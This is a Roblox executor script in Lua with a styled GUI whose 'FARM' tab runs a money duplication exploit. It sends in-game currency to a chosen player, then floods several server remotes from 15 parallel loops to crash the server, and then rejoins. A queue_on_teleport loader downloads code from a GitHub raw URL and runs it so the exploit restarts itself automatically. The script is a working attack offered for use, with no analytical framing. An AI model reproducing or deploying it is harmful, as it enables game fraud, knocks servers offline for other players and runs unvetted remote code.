--[[
    CENTRAL GLASS - MINT EDITION v2
    Style: Apple Glass Dark / Elegant / Limix Mint
    Variables: Short (3-4 chars)
    Tabs: Redesigned (Top Pills)
    --v2
]]

-- [ SVC ]
local PLRS = game:GetService("Players")
local TS = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local CORE = game:GetService("CoreGui")
local HS = game:GetService("HttpService")
local QUEUE_ON_TELEPORT = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
local STOP_DUPE = false

-- [ SINGLETON ]
if _G.CENTRAL_LOADED then
    warn("Central Glass Already Loaded!")
    return
end
_G.CENTRAL_LOADED = true

-- [ LOC ]
local LPLR = PLRS.LocalPlayer
local MSE = LPLR:GetMouse()

-- [ CFG ]
local CFG = {
    KEY = Enum.KeyCode.RightControl,
    IMG = "rbxassetid://108458500083995",
    COL = {
        BG = Color3.fromRGB(15, 15, 20),
        ACC = Color3.fromRGB(255, 120, 120), -- Soft Mint Red
        TXT = Color3.fromRGB(240, 240, 240),
        GRY = Color3.fromRGB(80, 80, 90),
        RED = Color3.fromRGB(255, 95, 87),
        YEL = Color3.fromRGB(255, 189, 46),
        GRN = Color3.fromRGB(39, 201, 63)
    },
    SPD = 0.3
}

-- [ FUN ]
local function SAVE_CFG(DATA)
    if not isfolder("CentralConfig") then makefolder("CentralConfig") end
    writefile("CentralConfig/config.json", HS:JSONEncode(DATA))
end

local function LOAD_CFG()
    if isfile("CentralConfig/config.json") then
        return HS:JSONDecode(readfile("CentralConfig/config.json"))
    end
    return {}
end

local function TWN(OBJ, PRP, TIM)
    local INF = TweenInfo.new(TIM or CFG.SPD, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    TS:Create(OBJ, INF, PRP):Play()
end

local function RND(OBJ, RAD)
    local CRN = Instance.new("UICorner", OBJ)
    CRN.CornerRadius = UDim.new(0, RAD or 12)
    return CRN
end

local function STR(OBJ, COL, THK)
    local BRD = Instance.new("UIStroke", OBJ)
    BRD.Color = COL or CFG.COL.ACC
    BRD.Thickness = THK or 1
    BRD.Transparency = 0.8 -- Softer Border
    return BRD
end

-- [ NOTIFY ]
local NOTIF_HOLDER = nil

local function NOTIFY(TITLE, MSG, TIME)
    -- Ensure Notification GUI exists independently
    local N_GUI = PLRS.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("CENTRAL_NOTIFS")
    if not N_GUI then
        N_GUI = Instance.new("ScreenGui")
        N_GUI.Name = "CENTRAL_NOTIFS"
        N_GUI.Parent = PLRS.LocalPlayer:WaitForChild("PlayerGui")
        N_GUI.ResetOnSpawn = false
        N_GUI.DisplayOrder = 10000 -- Top priority
        N_GUI.IgnoreGuiInset = true
    end
    
    local HOLDER = N_GUI:FindFirstChild("HOLDER")
    if not HOLDER then
        HOLDER = Instance.new("Frame", N_GUI)
        HOLDER.Name = "HOLDER"
        HOLDER.Size = UDim2.new(0, 250, 1, -40)
        HOLDER.Position = UDim2.new(1, -20, 0, 20)
        HOLDER.AnchorPoint = Vector2.new(1, 0)
        HOLDER.BackgroundTransparency = 1
        
        local LAY = Instance.new("UIListLayout", HOLDER)
        LAY.SortOrder = Enum.SortOrder.LayoutOrder
        LAY.Padding = UDim.new(0, 10)
        LAY.VerticalAlignment = Enum.VerticalAlignment.Top
    end
    
    local FRM = Instance.new("Frame", HOLDER)
    FRM.Size = UDim2.new(1, 0, 0, 60)
    FRM.BackgroundColor3 = CFG.COL.BG
    FRM.BackgroundTransparency = 0.1
    FRM.BorderSizePixel = 0
    RND(FRM, 10)
    STR(FRM, CFG.COL.ACC, 1)
    
    local BG = Instance.new("ImageLabel", FRM)
    BG.Size = UDim2.new(1,0,1,0)
    BG.Image = CFG.IMG
    BG.ImageTransparency = 0.8
    BG.ScaleType = Enum.ScaleType.Crop
    BG.BackgroundTransparency = 1
    RND(BG, 10)
    
    local T = Instance.new("TextLabel", FRM)
    T.Text = TITLE
    T.Size = UDim2.new(1, -20, 0, 20)
    T.Position = UDim2.new(0, 10, 0, 5)
    T.BackgroundTransparency = 1
    T.TextColor3 = CFG.COL.ACC
    T.Font = Enum.Font.GothamBold
    T.TextSize = 14
    T.TextXAlignment = Enum.TextXAlignment.Left
    
    local M = Instance.new("TextLabel", FRM)
    M.Text = MSG
    M.Size = UDim2.new(1, -20, 0, 30)
    M.Position = UDim2.new(0, 10, 0, 25)
    M.BackgroundTransparency = 1
    M.TextColor3 = CFG.COL.TXT
    M.Font = Enum.Font.Gotham
    M.TextSize = 12
    M.TextWrapped = true
    M.TextXAlignment = Enum.TextXAlignment.Left
    M.TextYAlignment = Enum.TextYAlignment.Top
    
    -- Animation
    FRM.Position = UDim2.new(1.2, 0, 0, 0)
    TWN(FRM, {Position = UDim2.new(0,0,0,0)}, 0.4)
    
    task.delay(TIME or 5, function()
        TWN(FRM, {BackgroundTransparency = 1}, 0.5)
        TWN(T, {TextTransparency = 1}, 0.5)
        TWN(M, {TextTransparency = 1}, 0.5)
        task.wait(0.5)
        FRM:Destroy()
    end)
end

-- [ HELPERS ]
local function ADD_LBL(PAG, TXT)
    local LBL = Instance.new("TextLabel", PAG)
    LBL.Size = UDim2.new(1, -10, 0, 25)
    LBL.BackgroundTransparency = 1
    LBL.Text = TXT
    LBL.TextColor3 = CFG.COL.ACC
    LBL.Font = Enum.Font.GothamBold
    LBL.TextSize = 14
    LBL.TextXAlignment = Enum.TextXAlignment.Left
    LBL.TextWrapped = true
    LBL.ZIndex = 15 -- High ZIndex to ensure visibility
    return LBL
end

local function ADD_BTN(PAG, TXT, CB)
    local BTN = Instance.new("TextButton", PAG)
    BTN.Size = UDim2.new(1, -10, 0, 35)
    BTN.BackgroundColor3 = Color3.new(0,0,0)
    BTN.BackgroundTransparency = 0.5
    BTN.Text = TXT
    BTN.TextColor3 = CFG.COL.TXT
    BTN.Font = Enum.Font.GothamBold
    BTN.TextSize = 14
    RND(BTN, 8)
    STR(BTN, CFG.COL.ACC, 1).Transparency = 0.8
    
    BTN.MouseButton1Click:Connect(function()
        TWN(BTN, {BackgroundColor3 = CFG.COL.ACC, TextColor3 = Color3.new(0,0,0)}, 0.1)
        task.wait(0.1)
        TWN(BTN, {BackgroundColor3 = Color3.new(0,0,0), TextColor3 = CFG.COL.TXT}, 0.2)
        if CB then CB() end
    end)
    return BTN
end

local function ADD_INP(PAG, PH, DEF, CB)
    local FRM = Instance.new("Frame", PAG)
    FRM.Size = UDim2.new(1, -10, 0, 35)
    FRM.BackgroundColor3 = Color3.new(0,0,0)
    FRM.BackgroundTransparency = 0.5
    RND(FRM, 8)
    STR(FRM, CFG.COL.GRY, 1)
    
    local BOX = Instance.new("TextBox", FRM)
    BOX.Size = UDim2.new(1, -20, 1, 0)
    BOX.Position = UDim2.new(0, 10, 0, 0)
    BOX.BackgroundTransparency = 1
    BOX.Text = DEF or ""
    BOX.PlaceholderText = PH
    BOX.TextColor3 = CFG.COL.TXT
    BOX.PlaceholderColor3 = CFG.COL.GRY
    BOX.Font = Enum.Font.Gotham
    BOX.TextSize = 14
    BOX.TextXAlignment = Enum.TextXAlignment.Left
    
    BOX.FocusLost:Connect(function()
        if CB then CB(BOX.Text) end
    end)
    return BOX
end

local function ADD_DRP(PAG, TTL, CB)
    local FRM = Instance.new("Frame", PAG)
    FRM.Size = UDim2.new(1, -10, 0, 35) -- Collapsed Size
    FRM.BackgroundColor3 = Color3.new(0,0,0)
    FRM.BackgroundTransparency = 0.5
    FRM.ClipsDescendants = true
    FRM.ZIndex = 5
    RND(FRM, 8)
    STR(FRM, CFG.COL.GRY, 1)
    
    local BTN = Instance.new("TextButton", FRM)
    BTN.Size = UDim2.new(1, 0, 0, 35)
    BTN.BackgroundTransparency = 1
    BTN.Text = "  " .. TTL
    BTN.TextColor3 = CFG.COL.TXT
    BTN.Font = Enum.Font.GothamBold
    BTN.TextSize = 14
    BTN.TextXAlignment = Enum.TextXAlignment.Left
    BTN.ZIndex = 6
    
    local ICO = Instance.new("ImageLabel", BTN)
    ICO.Size = UDim2.new(0, 20, 0, 20)
    ICO.Position = UDim2.new(1, -30, 0.5, -10)
    ICO.BackgroundTransparency = 1
    ICO.Image = "rbxassetid://6031091004" -- Arrow Down
    ICO.ImageColor3 = CFG.COL.ACC
    
    local SCR = Instance.new("ScrollingFrame", FRM)
    SCR.Size = UDim2.new(1, 0, 0, 150)
    SCR.Position = UDim2.new(0, 0, 0, 35)
    SCR.BackgroundTransparency = 1
    SCR.ScrollBarThickness = 2
    SCR.ScrollBarImageColor3 = CFG.COL.ACC
    SCR.ZIndex = 6
    
    local LAY = Instance.new("UIListLayout", SCR)
    LAY.SortOrder = Enum.SortOrder.LayoutOrder
    
    local OPEN = false
    
    local function RFSH(LST)
        for _, C in pairs(SCR:GetChildren()) do if C:IsA("TextButton") then C:Destroy() end end
        for _, P in pairs(LST) do
            local ITM = Instance.new("TextButton", SCR)
            ITM.Size = UDim2.new(1, 0, 0, 30)
            ITM.BackgroundTransparency = 1
            ITM.Text = "  " .. P
            ITM.TextColor3 = CFG.COL.GRY
            ITM.Font = Enum.Font.Gotham
            ITM.TextSize = 13
            ITM.TextXAlignment = Enum.TextXAlignment.Left
            ITM.ZIndex = 7
            
            ITM.MouseButton1Click:Connect(function()
                BTN.Text = "  " .. P
                OPEN = false
                TWN(FRM, {Size = UDim2.new(1, -10, 0, 35)})
                TWN(ICO, {Rotation = 0})
                if CB then CB(P) end
            end)
        end
        SCR.CanvasSize = UDim2.new(0, 0, 0, LAY.AbsoluteContentSize.Y)
    end
    
    BTN.MouseButton1Click:Connect(function()
        OPEN = not OPEN
        if OPEN then
            TWN(FRM, {Size = UDim2.new(1, -10, 0, 185)})
            TWN(ICO, {Rotation = 180})
        else
            TWN(FRM, {Size = UDim2.new(1, -10, 0, 35)})
            TWN(ICO, {Rotation = 0})
        end
    end)
    
    return {REFRESH = RFSH}
end

local function ADD_CRD(PAG, TIT, DES, CB)
    local CRD = Instance.new("Frame", PAG)
    CRD.BackgroundColor3 = Color3.new(0,0,0)
    CRD.BackgroundTransparency = 0.6
    RND(CRD, 10)
    STR(CRD, CFG.COL.ACC, 1).Transparency = 0.8
    
    local T = Instance.new("TextLabel", CRD)
    T.Text = TIT
    T.Size = UDim2.new(1, -10, 0, 20)
    T.Position = UDim2.new(0, 10, 0, 5)
    T.BackgroundTransparency = 1
    T.TextColor3 = CFG.COL.ACC
    T.Font = Enum.Font.GothamBold
    T.TextSize = 14
    T.TextXAlignment = Enum.TextXAlignment.Left
    
    local D = Instance.new("TextLabel", CRD)
    D.Text = DES
    D.Size = UDim2.new(1, -10, 0, 40)
    D.Position = UDim2.new(0, 10, 0, 25)
    D.BackgroundTransparency = 1
    D.TextColor3 = CFG.COL.TXT
    D.Font = Enum.Font.Gotham
    D.TextSize = 11
    D.TextWrapped = true
    D.TextXAlignment = Enum.TextXAlignment.Left
    D.TextYAlignment = Enum.TextYAlignment.Top
    
    local B = Instance.new("TextButton", CRD)
    B.Text = "ACTIVATE"
    B.Size = UDim2.new(1, -20, 0, 25)
    B.Position = UDim2.new(0, 10, 1, -30)
    B.BackgroundColor3 = CFG.COL.ACC
    B.TextColor3 = Color3.new(0,0,0)
    B.Font = Enum.Font.GothamBold
    B.TextSize = 11
    RND(B, 6)
    
    B.MouseButton1Click:Connect(function()
        TWN(B, {TextSize = 10}, 0.1)
        task.wait(0.1)
        TWN(B, {TextSize = 11}, 0.1)
        if CB then CB() end
    end)
    
    return CRD
end

-- [ GUI ]
local SCR = Instance.new("ScreenGui")
SCR.Name = "CEN_V2"
SCR.ResetOnSpawn = false
pcall(function() SCR.Parent = CORE end)
if not SCR.Parent then SCR.Parent = LPLR:WaitForChild("PlayerGui") end

-- [ MAIN ]
local MAIN = Instance.new("Frame", SCR)
MAIN.Name = "WIN"
MAIN.Size = UDim2.new(0, 550, 0, 350) -- Smaller Size
MAIN.Position = UDim2.new(0.5, -275, 0.5, -175)
MAIN.BackgroundColor3 = CFG.COL.BG
MAIN.BackgroundTransparency = 0.1
MAIN.BorderSizePixel = 0
MAIN.ClipsDescendants = true
RND(MAIN, 16)
STR(MAIN, CFG.COL.ACC, 1.5)

-- [ BG ]
local BG = Instance.new("ImageLabel", MAIN)
BG.Size = UDim2.new(1, 0, 1, 0)
BG.Image = CFG.IMG
BG.ScaleType = Enum.ScaleType.Crop
BG.ImageTransparency = 0.8
BG.BackgroundTransparency = 1
BG.ZIndex = 0
RND(BG, 16)

-- [ TTL BAR ] (Controls)
local BAR = Instance.new("Frame", MAIN)
BAR.Name = "BAR"
BAR.Size = UDim2.new(1, 0, 0, 40)
BAR.BackgroundTransparency = 1
BAR.ZIndex = 20 -- High ZIndex for Controls

local function MK_BTN(COL, POS)
    local BTN = Instance.new("TextButton", BAR)
    BTN.Size = UDim2.new(0, 14, 0, 14)
    BTN.Position = POS
    BTN.BackgroundColor3 = COL
    BTN.Text = ""
    BTN.AutoButtonColor = false
    BTN.ZIndex = 21 -- Even Higher
    RND(BTN, 10)
    
    local OVR = Instance.new("Frame", BTN)
    OVR.Size = UDim2.new(1,0,1,0)
    OVR.BackgroundColor3 = Color3.new(1,1,1)
    OVR.BackgroundTransparency = 1
    RND(OVR, 10)
    
    BTN.MouseEnter:Connect(function() TWN(OVR, {BackgroundTransparency=0.8}, 0.2) end)
    BTN.MouseLeave:Connect(function() TWN(OVR, {BackgroundTransparency=1}, 0.2) end)
    
    return BTN
end

local B_CLS = MK_BTN(CFG.COL.RED, UDim2.new(0, 15, 0.5, -7))
local B_MIN = MK_BTN(CFG.COL.YEL, UDim2.new(0, 35, 0.5, -7))
-- local B_MAX = MK_BTN(CFG.COL.GRN, UDim2.new(0, 55, 0.5, -7)) -- Optional

B_CLS.MouseButton1Click:Connect(function()
    SCR:Destroy()
end)

local IS_MIN = false
local OLD_SZ = UDim2.new(0,0,0,0)
B_MIN.MouseButton1Click:Connect(function()
    IS_MIN = not IS_MIN
    local TCON = MAIN:FindFirstChild("TABS")
    local PCON = MAIN:FindFirstChild("PGS")
    local RSZ = MAIN:FindFirstChild("ImageButton") -- Resize Handle

    if IS_MIN then
        OLD_SZ = MAIN.Size
        
        -- Hide Content First
        if TCON then TCON.Visible = false end
        if PCON then PCON.Visible = false end
        if RSZ then RSZ.Visible = false end

        TWN(MAIN, {Size = UDim2.new(0, 220, 0, 40), BackgroundTransparency = 0.2})
    else
        TWN(MAIN, {Size = OLD_SZ, BackgroundTransparency = 0.1})
        task.wait(0.3)
        
        -- Show Content After
        if TCON then TCON.Visible = true end
        if PCON then PCON.Visible = true end
        if RSZ then RSZ.Visible = true end
    end
end)

-- [ TABS CON ]
local TCON = Instance.new("Frame", MAIN)
TCON.Name = "TABS"
TCON.Size = UDim2.new(1, -140, 0, 35) -- Dynamic Width (Minus Controls)
TCON.Position = UDim2.new(0.5, 0, 0, 10) -- Center Top
TCON.AnchorPoint = Vector2.new(0.5, 0)
TCON.BackgroundColor3 = Color3.new(0,0,0)
TCON.BackgroundTransparency = 0.5
TCON.ZIndex = 10 -- High ZIndex
RND(TCON, 20)
STR(TCON, CFG.COL.ACC, 1).Transparency = 0.8

local TLAY = Instance.new("UIListLayout", TCON)
TLAY.FillDirection = Enum.FillDirection.Horizontal
TLAY.HorizontalAlignment = Enum.HorizontalAlignment.Center
TLAY.VerticalAlignment = Enum.VerticalAlignment.Center
TLAY.Padding = UDim.new(0.02, 0) -- Scale Padding

-- [ PAG CON ]
local PCON = Instance.new("Frame", MAIN)
PCON.Name = "PGS"
PCON.Size = UDim2.new(1, -20, 1, -60)
PCON.Position = UDim2.new(0, 10, 0, 55)
PCON.BackgroundTransparency = 1
PCON.ClipsDescendants = true
PCON.ZIndex = 5 -- Mid ZIndex

local CUR_BTN = nil
local CUR_PAG = nil

local function MK_TAB(TXT)
    local BTN = Instance.new("TextButton", TCON)
    BTN.Size = UDim2.new(0.18, 0, 0.8, 0) -- Scale Based (18% each, 5 tabs)
    BTN.BackgroundTransparency = 1
    BTN.Text = TXT
    BTN.TextColor3 = CFG.COL.GRY
    BTN.Font = Enum.Font.GothamBold
    BTN.TextScaled = true -- Auto resize text
    BTN.TextWrapped = true
    RND(BTN, 12)
    
    local TSC = Instance.new("UITextSizeConstraint", BTN)
    TSC.MaxTextSize = 12
    TSC.MinTextSize = 8
    
    local PAG = Instance.new("ScrollingFrame", PCON)
    PAG.Size = UDim2.new(1,0,1,0)
    PAG.BackgroundTransparency = 1
    PAG.Visible = false
    PAG.ScrollBarThickness = 2
    PAG.ScrollBarImageColor3 = CFG.COL.ACC
    PAG.AutomaticCanvasSize = Enum.AutomaticSize.Y -- Fix for scrolling content
    
    local LST = Instance.new("UIListLayout", PAG)
    LST.Padding = UDim.new(0, 8)
    LST.HorizontalAlignment = Enum.HorizontalAlignment.Center
    LST.SortOrder = Enum.SortOrder.LayoutOrder
    
    local PAD = Instance.new("UIPadding", PAG)
    PAD.PaddingTop = UDim.new(0,5)
    PAD.PaddingLeft = UDim.new(0,5)
    PAD.PaddingRight = UDim.new(0,5)
    PAD.PaddingBottom = UDim.new(0,5)

    BTN.MouseButton1Click:Connect(function()
        if CUR_BTN == BTN then return end
        
        -- Deactivate Old
        if CUR_BTN then
            TWN(CUR_BTN, {TextColor3 = CFG.COL.GRY, BackgroundTransparency = 1})
        end
        if CUR_PAG then
            CUR_PAG.Visible = false
        end
        
        -- Activate New
        CUR_BTN = BTN
        CUR_PAG = PAG
        
        TWN(BTN, {TextColor3 = Color3.new(0,0,0), BackgroundTransparency = 0, BackgroundColor3 = CFG.COL.ACC})
        PAG.Visible = true
        PAG.Position = UDim2.new(0, 10, 0, 0)
        TWN(PAG, {Position = UDim2.new(0,0,0,0)}, 0.3)
    end)
    
    return PAG
end

local P_HOM = MK_TAB("HOME")
local P_FRM = MK_TAB("FARM")
local P_VIS = MK_TAB("VISUAL")
local P_MSC = MK_TAB("MISC")
local P_SET = MK_TAB("CONFIG")

-- [ DUPE LOGIC ]
local REP = game:GetService("ReplicatedStorage")
local RS = game:GetService("RunService")
local TPS = game:GetService("TeleportService")

local SEL_PLR = nil
local AMT_SND = 1000000

local function FMT_NUM(N)
    return tostring(N):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

local MNY_RMT = REP:WaitForChild("Remotes"):WaitForChild("SendMoney")

-- [ FARM UI ]
ADD_LBL(P_FRM, "AUTO DUPE CONFIG")

-- Balance Monitor (Moved Top)
local BAL_LBL = ADD_LBL(P_FRM, "Balance: Loading...")
task.spawn(function()
    while true do
        task.wait(1)
        pcall(function()
            local UTL = require(REP.Functions:WaitForChild("Utility"))
            local DAT = UTL:GetClientData()
            local BAL = DAT and DAT.Balance or 0
            BAL_LBL.Text = "Balance: $" .. FMT_NUM(BAL)
        end)
    end
end)

-- Dropdown
local DRP_PLR = ADD_DRP(P_FRM, "Select Player", function(VAL)
    SEL_PLR = PLRS:FindFirstChild(VAL)
end)

-- Refresh Logic
local function UPD_PLR()
    local NMS = {}
    for _, P in pairs(PLRS:GetPlayers()) do
        if P ~= LPLR then table.insert(NMS, P.Name) end
    end
    DRP_PLR.REFRESH(NMS)
end
UPD_PLR() -- Init
ADD_BTN(P_FRM, "Refresh Players", UPD_PLR)

-- Amount Input
ADD_INP(P_FRM, "Amount (Default: 1M)", "1000000", function(VAL)
    AMT_SND = tonumber(VAL) or 0
end)

-- Dupe Logic Shared
local function START_DUPE(AUTO_MODE)
    -- 0. Register Rejoin Script IMMEDIATELY (Before Crash)
    if AUTO_MODE and QUEUE_ON_TELEPORT then
        local LOADER_CODE = [[
            repeat task.wait() until game:IsLoaded()
            
            local function RUN_URL()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Who1amG/MY-CENTRALL/main/WH0WH3ARE3.lua"))()
            end
            
            local S, E = pcall(function()
                if isfile and isfile("central.lua") then
                    loadstring(readfile("central.lua"))()
                    return true
                end
                return false
            end)
            
            if not S or not E then
                RUN_URL()
            end
        ]]
        QUEUE_ON_TELEPORT(LOADER_CODE)
    end

    STOP_DUPE = false -- Reset Stop Flag

    -- 1. Validate
    if not SEL_PLR then 
        NOTIFY("Error", "No Target Selected!", 3)
        return 
    end
    if AMT_SND <= 0 then
        NOTIFY("Validation Error", "Amount must be greater than 0!", 4)
        return
    end
    
    -- Save for Auto Mode
    if AUTO_MODE then
        local DATA = {
            AutoDupe = true,
            Target = SEL_PLR.Name,
            Amount = AMT_SND
        }
        SAVE_CFG(DATA)
    end
    
    NOTIFY("System", "Starting Dupe Sequence...", 3)
    
    -- Step 1: Send Money
    local MAX_PKT = 195000
    local WAIT_TM = 5.5
    local PKTS = math.ceil(AMT_SND / MAX_PKT)
    local SENT = 0
    
    task.spawn(function()
        for i = 1, PKTS do
            if STOP_DUPE then return end -- STOP CHECK
            local CUR_AMT = MAX_PKT
            if SENT + MAX_PKT > AMT_SND then CUR_AMT = AMT_SND - SENT end
            
            if CUR_AMT > 0 then
                MNY_RMT:FireServer(SEL_PLR.Name, CUR_AMT)
                SENT = SENT + CUR_AMT
                BAL_LBL.Text = "Sending: " .. i .. "/" .. PKTS .. " ($" .. FMT_NUM(CUR_AMT) .. ")"
            end
            
            if i < PKTS then task.wait(WAIT_TM) end
        end
        
        if STOP_DUPE then return end -- STOP CHECK

        BAL_LBL.Text = "Status: CRASHING SERVER..."
        NOTIFY("System", "Crashing Server...", 5)
        task.wait(0.5)
        
        -- Step 2: Crash
        local LAG = true
        local EVT = REP:WaitForChild("Events")
        local R_DAT = EVT:WaitForChild("ReceiveServerData")
        local D_FUN = EVT:WaitForChild("DataFunction")
        local SHR = REP:WaitForChild("Shared"):WaitForChild("Remotes")
        
        for i = 1, 15 do
            task.spawn(function()
                local MOD_RMT
                pcall(function() MOD_RMT = require(SHR) end)
                while LAG do
                    if STOP_DUPE then break end -- STOP CHECK
                    RS.Heartbeat:Wait()
                    pcall(function()
                        for _ = 1, 50 do
                            if MOD_RMT then
                                if MOD_RMT.HitmanHire then MOD_RMT.HitmanHire:FireServer("Server", 999999999) end
                                if MOD_RMT.BountyUpdateEvent then MOD_RMT.BountyUpdateEvent:FireServer() end
                            end
                            task.spawn(function() R_DAT:InvokeServer("GetData") end)
                            task.spawn(function() D_FUN:InvokeServer("GetData") end)
                        end
                    end)
                end
            end)
        end
        
        -- Step 3: Rejoin
        task.wait(3)
        if STOP_DUPE then -- STOP CHECK
            BAL_LBL.Text = "Status: Stopped."
            return
        end

        BAL_LBL.Text = "Status: Rejoining..."
        
        if AUTO_MODE then
            TPS:Teleport(game.PlaceId, LPLR)
        end
    end)
end

-- [ CONTROLS ]
ADD_BTN(P_FRM, "DUPE MONEY (ONE TIME)", function()
    START_DUPE(false)
end)

-- Check Auto Start
task.spawn(function()
    task.wait(2) -- Security Wait
    
    local CFG_DAT = LOAD_CFG()
    
    if CFG_DAT.AutoDupe then
        local T_NM = CFG_DAT.Target or ""
        local T_AM = CFG_DAT.Amount or 1000000
        
        MAIN.Visible = true -- Force visible
        
        if T_NM ~= "" then
            NOTIFY("Auto Dupe", "Config Found! Waiting for " .. T_NM, 10)
            AMT_SND = T_AM
            
            -- Wait for player loop
            local T_PLR = PLRS:FindFirstChild(T_NM)
            if not T_PLR then
                NOTIFY("System", "Player not here, waiting 60s...", 5)
                T_PLR = PLRS:WaitForChild(T_NM, 60)
            end
            
            if T_PLR then
                SEL_PLR = T_PLR
                NOTIFY("System", "Target Found! Waiting for Play...", 5)
                
                -- [ SMART WAIT: Play Detection ]
                -- Wait for MainScreen to EXIST (HUD loaded)
                local M_SCR = LPLR.PlayerGui:WaitForChild("MainScreen", 30)
                
                if M_SCR then
                    NOTIFY("System", "HUD Detected. Waiting for Char...", 5)
                    
                    -- Wait for Character to be fully ready
                    if not LPLR.Character then LPLR.CharacterAdded:Wait() end
                    local CHAR = LPLR.Character
                    
                    -- Wait for HumanoidRootPart to ensure physics are ready
                    local HRP = CHAR:WaitForChild("HumanoidRootPart", 10)
                    
                    NOTIFY("System", "Player Ready! Starting in 3s...", 3)
                    task.wait(3)
                else
                    NOTIFY("System", "UI Not Found, using 11s fallback...", 5)
                    task.wait(11)
                end
                
                START_DUPE(true)
            else
                NOTIFY("Auto Dupe", "Target not found! Stopping.", 10)
                CFG_DAT.AutoDupe = false
                SAVE_CFG(CFG_DAT)
            end
        end
    end
end)

local AUTO_BTN
AUTO_BTN = ADD_BTN(P_FRM, "AUTO DUPE: OFF", function()
    local CFG = LOAD_CFG()
    
    if CFG.AutoDupe then
        -- TURN OFF
        CFG.AutoDupe = false
        CFG.Target = "" -- Clear Target
        CFG.Amount = 0  -- Clear Amount
        SAVE_CFG(CFG)
        
        STOP_DUPE = true -- GLOBAL STOP
        
        AUTO_BTN.Text = "AUTO DUPE: OFF"
        NOTIFY("System", "Auto Dupe Stopped & Config Cleared", 5)
    else
        -- TURN ON
        if not SEL_PLR then NOTIFY("Error", "Select a Player first!", 3) return end
        
        CFG.AutoDupe = true
        CFG.Target = SEL_PLR.Name
        CFG.Amount = AMT_SND
        SAVE_CFG(CFG)
        
        AUTO_BTN.Text = "AUTO DUPE: ON"
        START_DUPE(true)
    end
end)

-- Update Button State on Load
task.spawn(function()
    task.wait(0.5)
    local CFG = LOAD_CFG()
    if CFG.AutoDupe then
        AUTO_BTN.Text = "AUTO DUPE: ON"
    end
end)

-- Activate First
local F_BTN = TCON:FindFirstChildOfClass("TextButton")
if F_BTN then
    CUR_BTN = F_BTN
    CUR_PAG = P_HOM
    TWN(F_BTN, {TextColor3 = Color3.new(0,0,0), BackgroundTransparency = 0, BackgroundColor3 = CFG.COL.ACC})
    P_HOM.Visible = true
end
local DRG = Instance.new("Frame", MAIN)
DRG.Size = UDim2.new(1, 0, 1, 0) -- Drag Anywhere
DRG.BackgroundTransparency = 1
DRG.ZIndex = 1 -- Behind everything interactive

local DG_ON, DG_STR, DG_POS
DRG.InputBegan:Connect(function(I)
    if I.UserInputType == Enum.UserInputType.MouseButton1 then
        DG_ON = true
        DG_STR = I.Position
        DG_POS = MAIN.Position
        I.Changed:Connect(function()
            if I.UserInputState == Enum.UserInputState.End then DG_ON = false end
        end)
    end
end)
UIS.InputChanged:Connect(function(I)
    if I.UserInputType == Enum.UserInputType.MouseMovement and DG_ON then
        local DEL = I.Position - DG_STR
        MAIN.Position = UDim2.new(DG_POS.X.Scale, DG_POS.X.Offset + DEL.X, DG_POS.Y.Scale, DG_POS.Y.Offset + DEL.Y)
    end
end)

-- [ RESIZE ]
local RSZ = Instance.new("ImageButton", MAIN)
RSZ.Size = UDim2.new(0, 20, 0, 20)
RSZ.Position = UDim2.new(1, -20, 1, -20)
RSZ.BackgroundTransparency = 1
RSZ.Image = "rbxassetid://6031097225" -- Corner Icon
RSZ.ImageColor3 = CFG.COL.ACC
RSZ.ImageTransparency = 0.5
RSZ.ZIndex = 10

local R_ON, R_STR, R_SIZ
RSZ.InputBegan:Connect(function(I)
    if I.UserInputType == Enum.UserInputType.MouseButton1 then
        R_ON = true
        R_STR = I.Position
        R_SIZ = MAIN.AbsoluteSize
        I.Changed:Connect(function()
            if I.UserInputState == Enum.UserInputState.End then R_ON = false end
        end)
    end
end)
UIS.InputChanged:Connect(function(I)
    if I.UserInputType == Enum.UserInputType.MouseMovement and R_ON then
        local DEL = I.Position - R_STR
        local NW_X = math.max(400, R_SIZ.X + DEL.X)
        local NW_Y = math.max(300, R_SIZ.Y + DEL.Y)
        MAIN.Size = UDim2.new(0, NW_X, 0, NW_Y)
    end
end)

-- [ TOGGLE ]
UIS.InputBegan:Connect(function(I, G)
    if not G and I.KeyCode == CFG.KEY then
        MAIN.Visible = not MAIN.Visible
    end
end)
